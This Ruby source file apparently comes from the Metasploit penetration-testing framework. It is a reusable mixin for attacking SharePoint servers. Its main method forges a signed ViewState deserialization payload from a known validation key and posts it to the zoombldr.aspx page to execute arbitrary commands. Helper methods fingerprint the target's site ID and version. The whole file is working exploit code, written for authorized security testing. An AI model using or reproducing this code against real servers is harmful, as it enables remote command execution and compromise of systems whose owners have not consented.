# -*- coding: binary -*-

module Msf
  class Exploit
    class Remote
      module HTTP
        # This module provides a way of interacting with sharepoint installations
        module Sharepoint

          include Msf::Exploit::Remote::HttpClient
          include Msf::Exploit::ViewState

          def sharepoint_execute_command_via_viewstate(cmd, validation_key, http_request_opts = {})
            vprint_status("Executing command: #{cmd}")

            res = send_request_cgi({
              'method' => 'POST',
              'uri' => normalize_uri(target_uri.path, '/_layouts/15/zoombldr.aspx'),
              'vars_post' => {
                '__VIEWSTATE' => generate_viewstate_payload(
                  cmd,
                  extra: pack_viewstate_generator('63E6434F'), # /_layouts/15/zoombldr.aspx
                  algo: 'sha256',
                  key: pack_viewstate_validation_key(validation_key)
                )
              }
            }.merge(http_request_opts))

            unless res
              fail_with(Failure::Unreachable, "Target did not respond to #{__method__}")
            end

            unless res.code == 200
              fail_with(Failure::PayloadFailed, "Failed to execute command: #{cmd}")
            end

            vprint_good('Successfully executed command')
          end

          def sharepoint_get_site_web_id(http_request_opts = {})
            res = send_request_cgi({
              'method' => 'GET',
              'uri' => normalize_uri(target_uri.path, '_api', 'web', 'id')
            }.merge(http_request_opts))

            return nil unless res

            res.get_xml_document.at('//d:Id')&.text
          end

          def sharepoint_get_version(http_request_opts = {})
            res = send_request_cgi({
              'method' => 'GET',
              'uri' => normalize_uri(target_uri.path)
            }.merge(http_request_opts))

            return nil unless /^(?<build>[\d.]+):/ =~ res&.headers['MicrosoftSharePointTeamServices']

            Rex::Version.new(build)
          end

        end
      end
    end
  end
end
